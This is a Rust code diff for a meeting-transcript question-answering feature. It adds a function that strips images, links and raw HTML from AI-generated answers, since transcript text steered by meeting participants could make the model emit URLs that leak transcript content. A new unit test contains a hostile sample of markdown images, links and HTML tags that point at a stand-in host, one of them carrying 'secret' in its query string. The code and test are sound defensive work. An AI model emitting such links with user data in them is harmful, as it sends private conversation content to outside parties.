@@ -526,7 +526,7 @@ pub const CITATION_LINK_SCHEME: &str = "parley-time:";
 /// (`[\[12:34\]](parley-time:754)`), so a markdown renderer shows it as a
 /// clickable link the UI can intercept. The visible text is unchanged.
 pub fn link_citations(answer: &str) -> String {
-    parse_citations(answer)
+    parse_citations(&defang_links(answer))
         .into_iter()
         .map(|span| match span {
             AnswerSpan::Text(text) => text,
@@ -537,6 +537,24 @@ pub fn link_citations(answer: &str) -> String {
             ),
         })
         .collect()
+}
+
+static IMAGE_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"!\[([^\]]*)\]\s*(\([^)]*\)|\[[^\]]*\])").unwrap());
+static LINK_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\[([^\]]+)\]\s*\([^)]*\)").unwrap());
+static LINK_DEF_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?m)^ {0,3}\[[^\]]+\]:.*$").unwrap());
+static TAG_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"<([A-Za-z/!])").unwrap());
+
+/// Strip everything in a model answer that could reach the network: images
+/// (rendered eagerly, so a URL carrying transcript text would leak it with
+/// no click), inline and reference links, and raw HTML / autolinks. The
+/// answer is built from transcript text, which anyone in the meeting can
+/// steer, so it's treated as untrusted markup. Link text is kept; only
+/// `[mm:ss]` citations become links again in [`link_citations`].
+pub fn defang_links(answer: &str) -> String {
+    let s = IMAGE_RE.replace_all(answer, "$1");
+    let s = LINK_RE.replace_all(&s, "$1");
+    let s = LINK_DEF_RE.replace_all(&s, "");
+    TAG_RE.replace_all(&s, "\\<$1").into_owned()
 }
 
 /// The time (seconds) a [`link_citations`] link points at, if `url` is one.
@@ -550,6 +568,23 @@ pub fn citation_link_seconds(url: &str) -> Option<f64> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn answers_cannot_carry_images_or_external_links() {
+        let hostile = "Done [12:34]. ![x](https://evil.example/?q=secret) \
+see [docs](https://evil.example/a) <img src=\"https://evil.example/i\"> \
+<https://evil.example/auto> ![r][ref]\n[ref]: https://evil.example/r";
+        let linked = link_citations(hostile);
+        assert!(!linked.contains("evil.example/?q"), "{linked}");
+        assert!(!linked.contains("](https://"), "{linked}");
+        assert!(!linked.contains("[ref]: "), "{linked}");
+        // Raw HTML and autolinks are escaped, so they render as text.
+        assert!(linked.contains("\\<img") && !linked.contains(" <img"), "{linked}");
+        assert!(linked.contains("\\<https") && !linked.contains(" <https"), "{linked}");
+        assert!(linked.contains("see docs"), "{linked}");
+        // The citation is still a link.
+        assert!(linked.contains(&format!("({CITATION_LINK_SCHEME}754)")), "{linked}");
+    }
 
     fn seg(start: f64, speaker: &str, text: &str) -> ContextSegment {
         ContextSegment {
